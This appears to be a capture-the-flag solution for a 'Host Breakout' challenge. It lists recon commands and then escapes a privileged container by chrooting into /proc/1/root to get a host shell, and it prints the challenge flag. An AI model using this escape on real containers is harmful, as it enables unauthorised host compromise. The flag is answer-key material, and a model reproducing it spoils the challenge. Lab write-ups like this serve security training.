# Challenge 3: Host Breakout

## Reconnaissance
```bash
# Check for hints
cat /tmp/challenge3-hint.txt

# Test host access
ls -la /proc/1/root/
whoami
id
```

## Execution
```bash
# chroot escape to host
chroot /proc/1/root /bin/bash
cat /tmp/challenge3-flag.txt
```

## Flag
`host-breakout{privileged_container_leads_to_host_compromise}` 